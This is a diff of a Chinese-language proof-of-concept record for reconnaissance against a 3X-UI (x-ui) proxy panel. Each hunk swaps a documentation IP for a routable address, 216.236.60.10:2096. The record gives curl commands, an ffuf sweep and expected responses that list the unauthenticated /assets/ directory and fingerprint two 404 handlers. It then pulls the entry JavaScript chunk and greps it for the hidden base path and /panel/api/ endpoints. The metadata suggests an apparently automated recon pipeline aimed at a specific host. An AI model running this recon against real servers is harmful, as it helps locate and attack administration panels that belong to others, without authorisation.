@@ -8,11 +8,11 @@
 - **language**: bash
 - **source**: self
 - **verified**: 1
-- **verified_note**: 2026-11-02T19:03-19:20Z 在 192.0.2.18:2096 实测（本机 curl.exe --noproxy '*' 直连，另用 ffuf dir-common-10769 全量复核同一结论）：① GET /assets/ → HTTP 200、Content-Type: text/html; charset=utf-8、Content-Length 9773，body 以 <pre> 开头并按 <a href="XrayPage-BAg5yWqc.js"> / <a href="login-CuP_WTT2.js"> / <a href="vendor-swagger-DXLbJ8D3.js"> 形式列出全部前端构建 chunk，据此确定性判定产品为 3X-UI（x-ui，含 Xray/AmneziaWG 分支）；② 对照 GET /assets（无尾斜杠）→ 301/43 归一化；③ GET /assets/nonexist.js → 404/0 字节（静态层独立 404 handler）；④ GET /zz9x7q2k → 404/18 字节 "404 page not found"（根路由层另一套 handler），并证明 SPA 首页与 /panel/api/... 均不在根下、位于随机 webBasePath。原始响应留存 D:/ARTEX/data/tasks/612/i7738/hit__assets_.txt、idx.js（含 window.X_UI_BASE_PATH 与 /panel/api/inbounds/options）。
+- **verified_note**: 2026-11-02T19:03-19:20Z 在 216.236.60.10:2096 实测（本机 curl.exe --noproxy '*' 直连，另用 ffuf dir-common-10769 全量复核同一结论）：① GET /assets/ → HTTP 200、Content-Type: text/html; charset=utf-8、Content-Length 9773，body 以 <pre> 开头并按 <a href="XrayPage-BAg5yWqc.js"> / <a href="login-CuP_WTT2.js"> / <a href="vendor-swagger-DXLbJ8D3.js"> 形式列出全部前端构建 chunk，据此确定性判定产品为 3X-UI（x-ui，含 Xray/AmneziaWG 分支）；② 对照 GET /assets（无尾斜杠）→ 301/43 归一化；③ GET /assets/nonexist.js → 404/0 字节（静态层独立 404 handler）；④ GET /zz9x7q2k → 404/18 字节 "404 page not found"（根路由层另一套 handler），并证明 SPA 首页与 /panel/api/... 均不在根下、位于随机 webBasePath。原始响应留存 D:/ARTEX/data/tasks/612/i7738/hit__assets_.txt、idx.js（含 window.X_UI_BASE_PATH 与 /panel/api/inbounds/options）。
 - **path**: pocs/3x-ui-x-ui-assets-unauth-directory-listing-and-dual-404-base/poc.sh
 - **tags**: 3x-ui,x-ui,xray,amneziawg,directory-listing,info-leak,fingerprint,vite,chunk,404-baseline,webbasepath
 - **created_at**: 2026-11-02T19:21:14.818Z
-- **engine**: 192.0.2.18:2096
+- **engine**: 216.236.60.10:2096
 - **found_by**: recon
 
 ## 描述
@@ -58,7 +58,7 @@
 
 ```bash
 curl.exe --noproxy '*' -sS -D - -o assets.txt \
-     http://192.0.2.18:2096/assets/
+     http://216.236.60.10:2096/assets/
 ```
 
 成立时：
@@ -80,12 +80,12 @@ Content-Length: 9773
 
 ```bash
 # 根路由层：18 字节 text/plain
-curl.exe --noproxy '*' -sS -D - http://192.0.2.18:2096/zz9x7q2k
+curl.exe --noproxy '*' -sS -D - http://216.236.60.10:2096/zz9x7q2k
 # -> HTTP/1.1 404 Not Found / Content-Type: text/plain / Content-Length: 18
 #    404 page not found
 
 # 静态层：0 字节，空 body
-curl.exe --noproxy '*' -sS -D - http://192.0.2.18:2096/assets/nonexist.js
+curl.exe --noproxy '*' -sS -D - http://216.236.60.10:2096/assets/nonexist.js
 # -> HTTP/1.1 404 Not Found / Content-Length: 0
 ```
 
@@ -110,7 +110,7 @@ curl.exe --noproxy '*' -sS -D - http://192.0.2.18:2096/assets/nonexist.js
 ```bash
 # 取入口 chunk，里面带 window.X_UI_BASE_PATH 与接口调用
 curl.exe --noproxy '*' -sS -o idx.js \
-     http://192.0.2.18:2096/assets/IndexPage-tZHM2Ebk.js
+     http://216.236.60.10:2096/assets/IndexPage-tZHM2Ebk.js
 grep -oE 'window\.X_UI_BASE_PATH[^,;]*' idx.js
 grep -oE '/panel/api/[a-zA-Z0-9/_-]+' idx.js
 ```
